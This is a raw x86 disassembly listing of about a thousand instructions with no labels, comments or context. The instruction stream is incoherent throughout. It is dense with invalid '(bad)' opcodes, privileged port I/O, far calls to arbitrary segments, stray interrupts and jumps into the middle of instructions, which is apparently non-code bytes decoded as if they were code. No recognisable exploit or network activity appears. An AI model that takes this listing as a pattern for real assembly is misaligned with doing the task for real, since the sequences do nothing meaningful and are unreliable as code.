  41f59f:	mov    ebp,0xe431c324
  41f5a4:	push   es
  41f5a5:	xchg   esi,eax
  41f5a6:	inc    esi
  41f5a7:	jl     0x41f539
  41f5a9:	xlat   BYTE PTR ds:[ebx]
  41f5aa:	cs cmp eax,0xcac4f14f
  41f5b0:	adc    BYTE PTR [esi],cl
  41f5b2:	in     al,0xca
  41f5b4:	(bad)  
  41f5b5:	imul   esp,esp,0x5cdade98
  41f5bb:	out    dx,eax
  41f5bc:	mov    edi,0x6633a462
  41f5c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5c2:	push   cs
  41f5c3:	clc    
  41f5c4:	(bad)  
  41f5c5:	gs inc esi
  41f5c7:	or     DWORD PTR [ecx],edi
  41f5c9:	xlat   BYTE PTR ds:[ebx]
  41f5ca:	cmp    esi,DWORD PTR [eax+0x52]
  41f5cd:	shl    esp,1
  41f5cf:	push   esp
  41f5d0:	(bad)  
  41f5d1:	adc    ebx,DWORD PTR [esi+0x68]
  41f5d4:	leave  
  41f5d5:	std    
  41f5d6:	jl     0x41f624
  41f5d8:	imul   edx,DWORD PTR [edi+ebp*1],0x3b742ff0
  41f5df:	shr    BYTE PTR cs:[edi],1
  41f5e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5e3:	sbb    DWORD PTR [eax],esp
  41f5e5:	sbb    DWORD PTR [ebx+0x4b],esi
  41f5e8:	push   ebx
  41f5e9:	in     eax,dx
  41f5ea:	outs   dx,BYTE PTR ds:[esi]
  41f5eb:	(bad)  
  41f5ec:	in     eax,dx
  41f5ed:	(bad)  
  41f5ee:	jle    0x41f571
  41f5f0:	mov    ecx,0x2fc70077
  41f5f5:	lock bound esi,QWORD PTR fs:[esi-0x8]
  41f5fa:	cs fs or edx,esp
  41f5fe:	mov    ds:0x16bd19d,eax
  41f603:	cmp    al,0xb3
  41f605:	and    bl,BYTE PTR [ecx]
  41f607:	pop    ebx
  41f608:	mov    edx,0xf3aeef03
  41f60d:	push   edi
  41f60e:	push   ecx
  41f60f:	aad    0x68
  41f611:	cld    
  41f612:	adc    DWORD PTR [edx+ecx*8+0x4d5107d2],edi
  41f619:	sbb    ebp,esi
  41f61b:	retf   
  41f61c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f61d:	or     edx,DWORD PTR [edx+0x172b93f3]
  41f623:	scas   eax,DWORD PTR es:[edi]
  41f624:	ret    
  41f625:	fdivr  DWORD PTR [ebp+0x1a395440]
  41f62b:	retf   
  41f62c:	xchg   DWORD PTR [ebp+0x48],ebx
  41f62f:	iret   
  41f630:	les    ebx,FWORD PTR [ecx+0x23]
  41f633:	js     0x41f635
  41f635:	inc    edi
  41f636:	jecxz  0x41f629
  41f638:	mov    esp,DWORD PTR [edx-0x17d8afdc]
  41f63e:	in     eax,dx
  41f63f:	leave  
  41f640:	add    ecx,esp
  41f642:	xor    eax,0x51c5b02
  41f647:	inc    ecx
  41f648:	xchg   edx,eax
  41f649:	dec    esi
  41f64a:	adc    ch,dh
  41f64c:	pop    ebp
  41f64d:	inc    esi
  41f64e:	or     ebp,esp
  41f650:	push   eax
  41f651:	pop    ebx
  41f652:	push   ebp
  41f653:	sbb    BYTE PTR [ebp+0xdbb818],bh
  41f659:	jnp    0x41f692
  41f65b:	out    dx,eax
  41f65c:	retf   
  41f65d:	xor    DWORD PTR [eiz*2+0x5d00e50d],edi
  41f664:	xor    edx,esi
  41f666:	dec    esp
  41f667:	cmp    al,0x69
  41f669:	mov    ebp,0x3d2942de
  41f66e:	mov    al,0xc
  41f670:	push   edx
  41f671:	cmp    bh,bl
  41f673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f674:	ins    BYTE PTR es:[edi],dx
  41f675:	repz aaa 
  41f677:	ror    BYTE PTR [eax],cl
  41f679:	and    eax,0xffffffa4
  41f67c:	mov    dh,0xf9
  41f67e:	fidiv  DWORD PTR [ebx]
  41f680:	out    0xfb,al
  41f682:	sbb    al,0x9e
  41f684:	cmp    BYTE PTR [eax+0x401fe0e2],0x69
  41f68b:	pop    eax
  41f68c:	sbb    BYTE PTR [eax+0x33],bh
  41f68f:	sbb    eax,0x7378a6bb
  41f694:	fs push eax
  41f696:	jbe    0x41f6a1
  41f698:	xchg   esi,eax
  41f699:	or     DWORD PTR [edi+0x281eee3],ecx
  41f69f:	cmp    al,0x52
  41f6a1:	sub    DWORD PTR [ebp+0x3d024a2a],eax
  41f6a7:	sbb    al,0x23
  41f6a9:	lds    edx,FWORD PTR [eax]
  41f6ab:	pop    ecx
  41f6ac:	test   DWORD PTR [ebp+ebx*8+0x12e37378],edi
  41f6b3:	je     0x41f68b
  41f6b5:	push   ecx
  41f6b6:	cmp    eax,0x2f8f616a
  41f6bb:	inc    edi
  41f6bc:	les    edi,FWORD PTR gs:[edx]
  41f6bf:	cmp    ah,bh
  41f6c1:	inc    ecx
  41f6c2:	idiv   bl
  41f6c4:	adc    al,0xbb
  41f6c6:	mov    al,0xfc
  41f6c8:	pop    ss
  41f6c9:	pusha  
  41f6ca:	mov    eax,0x2e174baa
  41f6cf:	push   ebp
  41f6d0:	out    0xd1,eax
  41f6d2:	ret    
  41f6d3:	ins    BYTE PTR es:[edi],dx
  41f6d4:	mov    edx,0x34dc475e
  41f6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6da:	jge    0x41f672
  41f6dc:	stos   DWORD PTR es:[di],eax
  41f6de:	js     0x41f6ef
  41f6e0:	sti    
  41f6e1:	xchg   BYTE PTR [ebx],ch
  41f6e3:	sbb    eax,0x4de20590
  41f6e8:	fidivr DWORD PTR [eax+eiz*8+0x5678cae7]
  41f6ef:	sbb    edx,DWORD PTR [ebx]
  41f6f1:	imul   BYTE PTR [edx-0x646dfb03]
  41f6f7:	dec    ebp
  41f6f8:	ss in  al,dx
  41f6fa:	mov    ch,0xb7
  41f6fc:	add    DWORD PTR [edx+0x53],ecx
  41f6ff:	pop    ds
  41f700:	cmp    eax,0xd8a1f1f2
  41f705:	inc    BYTE PTR ds:0x897e4e7b
  41f70b:	loope  0x41f6af
  41f70d:	push   esi
  41f70e:	pushf  
  41f70f:	lods   al,BYTE PTR ds:[esi]
  41f710:	mov    esi,0x9b5f4b45
  41f715:	aam    0xa6
  41f717:	dec    ecx
  41f718:	sbb    DWORD PTR [esi-0x64799256],ebx
  41f71e:	fstp   QWORD PTR [ecx+0x23]
  41f721:	jle    0x41f798
  41f723:	and    al,0xc
  41f725:	ss cs (bad) 
  41f729:	mov    ds:0x5453a50c,al
  41f72e:	gs das 
  41f730:	jbe    0x41f784
  41f732:	jo     0x41f6dd
  41f734:	add    BYTE PTR [ecx-0x2de7da22],ah
  41f73a:	rol    esi,1
  41f73c:	ror    BYTE PTR [esp+ebp*1+0x24f8cc2b],cl
  41f743:	outs   dx,BYTE PTR ds:[esi]
  41f744:	adc    ch,ah
  41f746:	pop    eax
  41f747:	add    eax,0xa2121527
  41f74c:	mov    ebx,0xb738021
  41f751:	jge    0x41f7aa
  41f753:	out    0xfd,eax
  41f755:	(bad)  
  41f757:	lock popa 
  41f759:	sub    al,0x55
  41f75b:	call   0xe557:0xe2e733ca
  41f762:	sbb    eax,0xbc7d1253
  41f767:	int    0x63
  41f769:	or     bh,BYTE PTR [eax-0x69]
  41f76c:	sbb    eax,0x9f1e3af8
  41f771:	and    BYTE PTR [esi-0xecbfe10],0xc0
  41f778:	push   eax
  41f779:	icebp  
  41f77a:	inc    esi
  41f77b:	das    
  41f77c:	jns    0x41f777
  41f77e:	mov    cl,0x58
  41f780:	xor    DWORD PTR [eax-0x63],edx
  41f783:	mov    ah,0xac
  41f785:	fcmovb st,st(6)
  41f787:	dec    edx
  41f788:	call   0x12b28d4c
  41f78d:	(bad)  
  41f78e:	pusha  
  41f78f:	cmp    ebp,DWORD PTR [esi-0x48783885]
  41f795:	(bad)
  41f798:	pop    ebp
  41f799:	(bad)  
  41f79a:	jp     0x41f7a9
  41f79c:	add    BYTE PTR [ecx-0x19],0x62
  41f7a0:	xchg   edi,eax
  41f7a1:	cmp    eax,0x2b27014a
  41f7a6:	cmp    esi,0x645455b0
  41f7ac:	(bad)  
  41f7ad:	out    0xc3,eax
  41f7af:	fadd   DWORD PTR [esi+0x5f9fb190]
  41f7b5:	xchg   esp,eax
  41f7b6:	(bad)  
  41f7b7:	lea    esi,ds:0x12efa7ea
  41f7bd:	mov    ah,0xbd
  41f7bf:	jno    0x41f7dd
  41f7c1:	fs leave 
  41f7c3:	aas    
  41f7c4:	shr    DWORD PTR ds:[ebp-0x6ce8adca],1
  41f7cb:	add    ebx,DWORD PTR [ecx]
  41f7cd:	mov    edi,0x936ffdf0
  41f7d2:	cmp    DWORD PTR [ebx+0x6bbb1a1],ebp
  41f7d8:	push   edx
  41f7d9:	jle    0x41f7f0
  41f7db:	iret   
  41f7dc:	bound  ebx,QWORD PTR [ebp+0x3b103feb]
  41f7e2:	test   DWORD PTR [ecx+0x64],0x81334eb0
  41f7e9:	adc    DWORD PTR [edx],0x205470d5
  41f7ef:	jl     0x41f850
  41f7f1:	jp     0x41f79b
  41f7f3:	pop    esi
  41f7f4:	push   ss
  41f7f5:	and    dh,BYTE PTR [ebp+edx*1+0x1d]
  41f7f9:	dec    ecx
  41f7fa:	fnstcw WORD PTR [ecx]
  41f7fc:	daa    
  41f7fd:	ficom  WORD PTR [ebx]
  41f7ff:	int    0x7d
  41f801:	mov    cl,0xdd
  41f803:	inc    ebx
  41f804:	push   DWORD PTR [ebp-0x27bbecde]
  41f80a:	push   es
  41f80b:	pop    edx
  41f80c:	leave  
  41f80d:	sub    ebx,esp
  41f80f:	enter  0xe0bd,0xa9
  41f813:	and    ecx,DWORD PTR [esp+edi*2]
  41f816:	dec    ecx
  41f817:	repnz outs dx,BYTE PTR ds:[esi]
  41f819:	or     DWORD PTR [ebx+0xe],0x5753c372
  41f820:	cwde   
  41f821:	hlt    
  41f822:	scas   al,BYTE PTR es:[edi]
  41f823:	mov    eax,ds:0x6278bf4a
  41f828:	jno    0x41f862
  41f82a:	ja     0x41f7c2
  41f82c:	mov    esp,0x51b94cce
  41f831:	push   esi
  41f832:	mov    ah,0x8f
  41f834:	jge    0x41f845
  41f836:	fld    st(7)
  41f838:	push   ss
  41f839:	popa   
  41f83a:	aam    0x6e
  41f83c:	add    BYTE PTR [edi-0x4ad03bec],0x26
  41f843:	xor    eax,0x61122e31
  41f848:	adc    DWORD PTR ds:0xc07c8442,ebx
  41f84e:	int    0x2f
  41f850:	out    0xb2,al
  41f852:	sbb    al,0xce
  41f854:	out    0x14,eax
  41f856:	rcr    DWORD PTR [edi-0x5b],0x44
  41f85a:	aad    0x2c
  41f85c:	inc    esi
  41f85d:	push   ebx
  41f85e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f85f:	fstp   DWORD PTR [ebx]
  41f861:	mov    edx,DWORD PTR [edi-0x1e]
  41f864:	dec    esi
  41f865:	shl    al,0x37
  41f868:	es call 0x1f24b07a
  41f86e:	dec    ebp
  41f86f:	nop
  41f870:	lds    esi,FWORD PTR [edx+0xb528f29]
  41f876:	aad    0x2
  41f878:	and    BYTE PTR [ebp-0x31],bl
  41f87b:	xor    BYTE PTR [esi+0x6f],bh
  41f87e:	sbb    dh,ah
  41f880:	call   0x7b90be87
  41f885:	sar    edx,0xa7
  41f888:	aad    0xc5
  41f88a:	inc    ebx
  41f88b:	aaa    
  41f88c:	cmp    ebp,esi
  41f88e:	add    DWORD PTR [ecx-0x3d0de40f],edi
  41f894:	or     DWORD PTR [ecx+0x6d],0x48
  41f898:	push   0xffffff89
  41f89a:	out    0xe0,al
  41f89c:	sub    DWORD PTR [edi-0x59],ebx
  41f89f:	xchg   ch,ch
  41f8a1:	cmp    al,ch
  41f8a3:	lds    ebp,FWORD PTR [eax+0x7f219f36]
  41f8a9:	sub    DWORD PTR [ebp-0x2fbab3b6],edi
  41f8af:	cmp    DWORD PTR ds:0x51922f70,ebp
  41f8b5:	push   0x172a8abd
  41f8ba:	or     eax,0xba7b896c
  41f8bf:	rcr    BYTE PTR [edx-0x74],cl
  41f8c2:	call   0x6b214ee
  41f8c7:	adc    al,0xc6
  41f8c9:	cli    
  41f8ca:	mov    al,ds:0x392e03a
  41f8cf:	inc    ecx
  41f8d0:	dec    edi
  41f8d1:	mov    ds:0x11a081e0,al
  41f8d6:	inc    eax
  41f8d7:	cli    
  41f8d8:	push   ebx
  41f8d9:	sahf   
  41f8da:	popf   
  41f8db:	xor    bh,cl
  41f8dd:	dec    ecx
  41f8de:	mov    eax,0x8a418c7f
  41f8e3:	cmp    DWORD PTR ds:0x5fbb42cb,0xfeefce23
  41f8ed:	fidiv  WORD PTR [edi]
  41f8ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8f0:	ss jmp 0x41f8b7
  41f8f3:	hlt    
  41f8f4:	sub    ecx,DWORD PTR [ebx-0x529e01ab]
  41f8fa:	test   eax,0x1941999a
  41f8ff:	xor    ah,BYTE PTR [edi+0x56]
  41f902:	push   es
  41f903:	mov    cl,0xcb
  41f905:	std    
  41f906:	jo     0x41f8bd
  41f908:	and    dl,BYTE PTR [ebx-0x247e1432]
  41f90e:	sub    edi,ecx
  41f910:	pop    es
  41f911:	aas    
  41f912:	iret   
  41f913:	nop
  41f914:	or     bh,BYTE PTR [esi+0x6504e67a]
  41f91a:	mov    ebx,0x39a0b2dc
  41f91f:	add    BYTE PTR [eax],0x69
  41f922:	(bad)  
  41f923:	(bad)  
  41f924:	retf   
  41f925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f926:	sar    DWORD PTR [eax],0x66
  41f929:	lahf   
  41f92a:	ins    BYTE PTR es:[edi],dx
  41f92b:	fimul  DWORD PTR [edi-0x76eceb0c]
  41f931:	dec    ebx
  41f932:	out    dx,eax
  41f933:	mov    ch,0x2f
  41f935:	mov    dl,0x9
  41f937:	mov    eax,0x146e48f3
  41f93c:	mov    bl,0x1
  41f93e:	mov    BYTE PTR [edx],al
  41f940:	jns    0x41f90b
  41f942:	ins    DWORD PTR es:[edi],dx
  41f943:	push   edi
  41f944:	mov    ch,BYTE PTR [ebp+0x5b]
  41f947:	or     DWORD PTR [ebp-0x387b7657],edx
  41f94d:	fdiv   st(7),st
  41f94f:	mov    esi,0xff1d749a
  41f954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f955:	fld    TBYTE PTR [edi-0x59]
  41f958:	jmp    0x5fce50b3
  41f95d:	popa   
  41f95e:	cmp    al,0xd2
  41f960:	jge    0x41f90c
  41f962:	jmp    0x41f9bd
  41f964:	and    cl,bl
  41f966:	test   eax,0x727654f7
  41f96b:	push   edi
  41f96c:	or     ebp,ecx
  41f96e:	pop    esi
  41f96f:	in     al,dx
  41f970:	xor    BYTE PTR [ebx+edx*2+0x7c471574],bl
  41f977:	sbb    BYTE PTR [edi-0x431bc3b5],0xda
  41f97e:	loopne 0x41f93d
  41f980:	push   edx
  41f981:	icebp  
  41f982:	and    al,0xeb
  41f984:	dec    esi
  41f985:	push   ebx
  41f986:	and    al,0x67
  41f988:	xchg   ebp,eax
  41f989:	(bad)  [edi]
  41f98b:	push   ds
  41f98c:	xchg   esi,eax
  41f98d:	sahf   
  41f98e:	sub    DWORD PTR [esi],eax
  41f990:	lds    edx,FWORD PTR [esp+eax*1-0x26632e7a]
  41f997:	outs   dx,DWORD PTR ds:[esi]
  41f998:	pusha  
  41f999:	call   0x3875:0x86b7a2d8
  41f9a0:	les    ecx,FWORD PTR [edi-0x1d]
  41f9a3:	(bad)  
  41f9a4:	pop    ds
  41f9a5:	jle    0x41f968
  41f9a7:	push   cs
  41f9a8:	aaa    
  41f9a9:	cmp    BYTE PTR [ecx],ch
  41f9ab:	adc    bl,BYTE PTR [ebx]
  41f9ad:	fbstp  TBYTE PTR [ebx-0x7]
  41f9b0:	mov    ebx,0x7f87f13d
  41f9b5:	pop    ecx
  41f9b6:	std    
  41f9b7:	aaa    
  41f9b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9b9:	leave  
  41f9ba:	cmp    DWORD PTR [edi],ebx
  41f9bc:	jmp    0x41f9de
  41f9be:	xor    edx,edx
  41f9c0:	ss add al,0x6
  41f9c3:	push   ecx
  41f9c4:	popf   
  41f9c5:	mov    WORD PTR [eax],ds
  41f9c7:	xchg   edx,eax
  41f9c8:	test   cl,dl
  41f9ca:	fild   WORD PTR [edx]
  41f9cc:	and    ch,BYTE PTR [edx]
  41f9ce:	jb     0x41f9ec
  41f9d0:	inc    ebx
  41f9d1:	adc    eax,0x1f5faeb1
  41f9d6:	fwait
  41f9d7:	mov    fs,WORD PTR fs:[edi-0x67]
  41f9db:	xchg   ch,al
  41f9dd:	in     al,dx
  41f9de:	xor    ch,BYTE PTR [edx]
  41f9e0:	adc    al,0xa0
  41f9e2:	into   
  41f9e3:	in     al,dx
  41f9e4:	sub    al,0x8b
  41f9e6:	lods   eax,DWORD PTR ds:[esi]
  41f9e7:	in     al,dx
  41f9e8:	out    0x33,eax
  41f9ea:	adc    bl,BYTE PTR [ecx-0x10]
  41f9ed:	cmp    al,0x17
  41f9ef:	popa   
  41f9f0:	aad    0xe3
  41f9f2:	fs or  eax,0xec863804
  41f9f8:	lds    edx,FWORD PTR [edi+esi*8+0x2a7caec5]
  41f9ff:	cmp    eax,0x6b24eb28
  41fa04:	(bad)
  41fa08:	xor    edx,DWORD PTR [ebp-0x23]
  41fa0b:	je     0x41fa09
  41fa0d:	daa    
  41fa0e:	fisttp WORD PTR [edi*8+0x21b2c11a]
  41fa15:	iret   
  41fa16:	mov    esp,DWORD PTR [edi]
  41fa18:	or     esi,DWORD PTR [edi]
  41fa1a:	jle    0x41f9de
  41fa1c:	xchg   esp,esi
  41fa1e:	add    eax,0x594a2747
  41fa23:	je     0x41f9de
  41fa25:	cld    
  41fa26:	jecxz  0x41fa19
  41fa28:	sbb    al,0x52
  41fa2a:	mov    ebx,0xe5497829
  41fa2f:	sub    BYTE PTR [ebp-0x4c],dh
  41fa32:	je     0x41faaa
  41fa34:	mov    al,ds:0x87651f70
  41fa39:	sbb    edx,edx
  41fa3b:	loopne 0x41fa5a
  41fa3d:	mov    ecx,0xc7b1ead9
  41fa42:	retf   0x3e5c
  41fa45:	fsubr  QWORD PTR [eax+ecx*8]
  41fa48:	inc    edi
  41fa49:	xor    cl,BYTE PTR ds:0xf3888fe
  41fa4f:	add    al,0xbb
  41fa51:	xchg   ebx,eax
  41fa52:	fiadd  WORD PTR [edi]
  41fa54:	cmp    eax,0x28719d66
  41fa59:	ret    0xbe17
  41fa5c:	rep stos DWORD PTR es:[edi],eax
  41fa5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa5f:	lea    ebp,[esp+ebx*2-0x26]
  41fa63:	push   ebp
  41fa64:	(bad)  
  41fa65:	out    dx,al
  41fa66:	inc    edx
  41fa67:	addr16 (bad) 
  41fa69:	jmp    0xcef0:0x3861a3f7
  41fa70:	cdq    
  41fa71:	test   DWORD PTR [ecx],eax
  41fa73:	mov    ebp,0x55453132
  41fa78:	xchg   ecx,eax
  41fa79:	xor    eax,0xf8a5e3ad
  41fa7e:	lahf   
  41fa7f:	mov    cs,WORD PTR [ecx-0x77]
  41fa82:	mov    WORD PTR [edi-0x22],ds
  41fa85:	shl    DWORD PTR [ebp-0x58],cl
  41fa88:	in     eax,dx
  41fa89:	jmp    0x812c0eb4
  41fa8e:	fstp   st(4)
  41fa90:	push   0x4d2434f4
  41fa95:	pusha  
  41fa96:	ret    
  41fa97:	call   0x2599:0x32cf3db1
  41fa9e:	pop    edx
  41fa9f:	adc    ebx,esi
  41faa1:	sub    edi,DWORD PTR [ecx]
  41faa3:	in     eax,dx
  41faa4:	pop    esp
  41faa5:	leave  
  41faa6:	cmp    al,0xd0
  41faa8:	xchg   ebx,eax
  41faa9:	push   cs
  41faaa:	mov    ebp,0xd78f6a25
  41faaf:	popf   
  41fab0:	dec    ecx
  41fab1:	addr16 (bad) 
  41fab3:	push   ebx
  41fab4:	xchg   edx,eax
  41fab5:	or     dl,BYTE PTR [ebx-0x2424efa6]
  41fabb:	sub    edx,DWORD PTR [ecx+ebp*4]
  41fabe:	cli    
  41fabf:	add    edi,DWORD PTR [edx]
  41fac1:	into   
  41fac2:	fbstp  TBYTE PTR [esp+eax*1]
  41fac5:	fidivr WORD PTR [esp+edi*4]
  41fac8:	fidiv  WORD PTR [edi]
  41faca:	pop    ds
  41facb:	add    al,0xd3
  41facd:	(bad)  [edx+edx*1-0x3e]
  41fad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fad2:	lahf   
  41fad3:	idiv   BYTE PTR [edi+0x24]
  41fad6:	sbb    ecx,edi
  41fad8:	push   ds
  41fad9:	sub    al,0xa1
  41fadb:	out    dx,al
  41fadc:	stos   DWORD PTR es:[edi],eax
  41fadd:	les    esi,FWORD PTR [ecx+0x700a7304]
  41fae3:	or     eax,DWORD PTR [edx-0x5f49eee9]
  41fae9:	dec    ebp
  41faea:	popa   
  41faeb:	(bad)  
  41faec:	lea    ebx,[ebx+ebx*8-0xb8c9a55]
  41faf3:	mov    ds:0x465abfd9,al
  41faf8:	mov    ch,BYTE PTR [ecx+0x5c]
  41fafb:	cwde   
  41fafc:	sti    
  41fafd:	(bad)  
  41faff:	sub    DWORD PTR [ebp+ebx*4+0x44],0x4d925f6c
  41fb07:	add    esp,ecx
  41fb09:	push   cs
  41fb0a:	mov    bh,0xe7
  41fb0c:	sub    esp,ebp
  41fb0e:	stos   DWORD PTR es:[edi],eax
  41fb0f:	lea    ecx,[eax]
  41fb11:	nop
  41fb12:	jne    0x41faaf
  41fb14:	dec    esp
  41fb15:	or     eax,0x889fa11c
  41fb1a:	mul    BYTE PTR [esi]
  41fb1c:	nop
  41fb1d:	mov    edx,0xd2b2fc42
  41fb22:	in     al,0x4f
  41fb24:	stc    
  41fb25:	pop    ds
  41fb26:	out    dx,al
  41fb27:	daa    
  41fb28:	pop    eax
  41fb29:	pop    ds
  41fb2a:	or     DWORD PTR [edx-0x3],esp
  41fb2d:	jae    0x41fb0c
  41fb2f:	retf   
  41fb30:	dec    eax
  41fb31:	sub    ah,BYTE PTR [edi]
  41fb33:	pop    edx
  41fb34:	icebp  
  41fb35:	jg     0x41fb92
  41fb37:	ins    BYTE PTR es:[edi],dx
  41fb38:	cmp    al,0x86
  41fb3a:	pusha  
  41fb3b:	fidiv  DWORD PTR [eax+0x4f]
  41fb3e:	sbb    BYTE PTR [edi],cl
  41fb40:	lds    edi,FWORD PTR [eax+0x2453cafe]
  41fb46:	nop
  41fb47:	jne    0x41fb70
  41fb49:	adc    BYTE PTR [eax+edx*8+0x33],dh
  41fb4d:	adc    BYTE PTR [ebx-0x588985e],cl
  41fb53:	retf   0x8cf3
  41fb56:	mov    ah,0x6b
  41fb58:	adc    eax,DWORD PTR [ebx+0x23]
  41fb5b:	rol    DWORD PTR [ebx+0x72bf51a6],cl
  41fb61:	jnp    0x41fb36
  41fb63:	daa    
  41fb64:	jo     0x41fbd2
  41fb66:	sub    al,0xee
  41fb68:	iret   
  41fb69:	and    al,0x69
  41fb6b:	or     al,0x64
  41fb6d:	mov    cl,0xe3
  41fb6f:	adc    eax,edx
  41fb71:	or     BYTE PTR [esi-0x6a],bl
  41fb74:	test   DWORD PTR [esi-0x50],eax
  41fb77:	add    BYTE PTR [ebp+0x38],al
  41fb7a:	lods   eax,DWORD PTR ds:[esi]
  41fb7b:	jnp    0x41fb8d
  41fb7d:	jmp    0x41fb07
  41fb7f:	ja     0x41fb8b
  41fb81:	xor    ebp,DWORD PTR [esi]
  41fb83:	xchg   esp,eax
  41fb84:	pop    eax
  41fb85:	mov    ds:0x37ceeaa6,eax
  41fb8a:	push   ebx
  41fb8b:	or     ebx,DWORD PTR [eax-0x3ba82c49]
  41fb91:	jne    0x41fb2b
  41fb93:	out    dx,al
  41fb94:	test   DWORD PTR [edi-0x1663ba21],esp
  41fb9a:	popa   
  41fb9b:	pop    edi
  41fb9c:	pushf  
  41fb9d:	jp     0x41fb3d
  41fb9f:	jge    0x41fc03
  41fba1:	mul    BYTE PTR [edx-0x16]
  41fba4:	adc    ah,bl
  41fba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fba7:	in     eax,dx
  41fba8:	jg     0x41fbdc
  41fbaa:	adc    dl,bl
  41fbac:	es pop ss
  41fbae:	mov    bl,BYTE PTR [edx+ebx*4]
  41fbb1:	inc    ebp
  41fbb2:	xchg   ecx,eax
  41fbb3:	aaa    
  41fbb4:	dec    ecx
  41fbb5:	mov    al,ds:0xdbe24831
  41fbba:	inc    edx
  41fbbb:	pop    ecx
  41fbbc:	mov    bl,0xca
  41fbbe:	in     eax,dx
  41fbbf:	call   0xbb29:0x923587ec
  41fbc6:	es sbb al,0xb7
  41fbc9:	sub    edx,DWORD PTR [eax+0x57]
  41fbcc:	and    ecx,esi
  41fbce:	cmc    
  41fbcf:	inc    edi
  41fbd0:	test   BYTE PTR [eax+0x5e059098],cl
  41fbd6:	cmp    edi,DWORD PTR [edi-0x3628b773]
  41fbdc:	push   ebx
  41fbdd:	dec    ecx
  41fbde:	mov    ebx,0x781bf8c2
  41fbe3:	and    eax,0x82c047de
  41fbe8:	or     esp,DWORD PTR [esi]
  41fbea:	lods   eax,DWORD PTR ds:[esi]
  41fbeb:	jg     0x41fb77
  41fbed:	push   ecx
  41fbee:	jbe    0x41fc48
  41fbf0:	push   cs
  41fbf1:	fs in  eax,0xa2
  41fbf4:	ds or  eax,0x27284456
  41fbfa:	xchg   edx,eax
  41fbfb:	retf   
  41fbfc:	(bad)  
  41fbfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbfe:	out    dx,al
  41fbff:	test   BYTE PTR [esi+0x79ed1282],0x3e
  41fc06:	pop    ecx
  41fc07:	pushf  
  41fc08:	clc    
  41fc09:	inc    DWORD PTR [eax+0x4b]
  41fc0c:	lds    edi,FWORD PTR [edx+0x5e]
  41fc0f:	xor    dh,BYTE PTR [edx-0x9efa5e]
  41fc15:	loopne 0x41fc36
  41fc17:	cmp    BYTE PTR [edx],cl
  41fc19:	into   
  41fc1a:	sub    ecx,DWORD PTR [eax+0x3b]
  41fc1d:	push   esp
  41fc1e:	mov    eax,0x233085a5
  41fc23:	ins    DWORD PTR es:[edi],dx
  41fc24:	int3   
  41fc25:	cmp    DWORD PTR ds:0x848a393,ebp
  41fc2b:	mov    eax,ds:0xbef9ce6a
  41fc30:	inc    eax
  41fc31:	pop    esp
  41fc32:	pop    esp
  41fc33:	cld    
  41fc34:	jns    0x41fc19
  41fc36:	inc    esi
  41fc37:	cmp    ebp,DWORD PTR [esi+0x61]
  41fc3a:	and    al,0xe4
  41fc3c:	arpl   WORD PTR [esi+0x27],bp
  41fc3f:	push   0xffffff9c
  41fc41:	ins    DWORD PTR es:[edi],dx
  41fc42:	or     eax,0x13880274
  41fc47:	pop    ebp
  41fc48:	mov    esi,DWORD PTR [eax+ecx*2-0x61]
  41fc4c:	jle    0x41fbd6
  41fc4e:	inc    ebx
  41fc4f:	fnstcw WORD PTR [ebp-0x39f87c0b]
  41fc55:	ret    
  41fc56:	inc    ebp
  41fc57:	xlat   BYTE PTR ds:[ebx]
  41fc58:	xor    al,0x7e
  41fc5a:	fcomp  QWORD PTR [ecx-0x5c574a27]
  41fc60:	aas    
  41fc61:	ror    bh,0x5c
  41fc64:	jmp    0x41fcde
  41fc66:	out    0x60,al
  41fc68:	sub    al,BYTE PTR [ebx+0x4abeb7d6]
  41fc6e:	mov    ebp,ebx
  41fc70:	sub    al,dl
  41fc72:	pop    ebx
  41fc73:	sbb    BYTE PTR [eax-0x2],bl
  41fc76:	cmp    DWORD PTR ds:0xb2605749,esp
  41fc7c:	ret    
  41fc7d:	arpl   WORD PTR [ebx+0x14af94c6],bp
  41fc83:	add    al,0xf6
  41fc85:	xor    esi,DWORD PTR [eax]
  41fc87:	sbb    al,0x5b
  41fc89:	mov    dh,0xb8
  41fc8b:	push   edx
  41fc8c:	dec    ebx
  41fc8d:	test   BYTE PTR [eax+0x4d009490],bh
  41fc93:	push   ecx
  41fc94:	xor    DWORD PTR [edx+esi*2-0x3f],ebx
  41fc98:	push   0x8a2fea04
  41fc9d:	fild   WORD PTR ds:0x13d1391a
  41fca3:	les    edi,FWORD PTR [esi+0x2f]
  41fca6:	pop    ecx
  41fca7:	arpl   WORD PTR [eax+0x7ae9da18],si
  41fcad:	jbe    0x41fcb7
  41fcaf:	aam    0x3e
  41fcb1:	adc    BYTE PTR [esi-0x3364c4ee],ch
  41fcb7:	pushf  
  41fcb8:	mov    eax,0x3e89c6e5
  41fcbd:	aas    
  41fcbe:	mov    bl,0x6c
  41fcc0:	inc    esi
  41fcc1:	in     al,dx
  41fcc2:	mov    ecx,0x784c919c
  41fcc7:	bound  bx,DWORD PTR [ebp-0x50b8b676]
  41fcce:	and    edi,DWORD PTR [eax+0x5e]
  41fcd1:	add    DWORD PTR [ecx+ebx*1],edi
  41fcd4:	xchg   ebx,eax
  41fcd5:	aad    0x47
  41fcd7:	shl    BYTE PTR [ebx+0x2c09b578],0x81
  41fcde:	xchg   esp,eax
  41fcdf:	adc    DWORD PTR [ebp-0x7c],0xfdb75c0
  41fce6:	aam    0x7
  41fce8:	mov    ebx,0x226697de
  41fced:	ins    DWORD PTR es:[edi],dx
  41fcee:	cmp    DWORD PTR ds:0x60914605,esp
  41fcf4:	mov    BYTE PTR [edi+0x49],bl
  41fcf7:	paddsw mm3,QWORD PTR [ecx+0x23]
  41fcfb:	add    eax,0x6b296c75
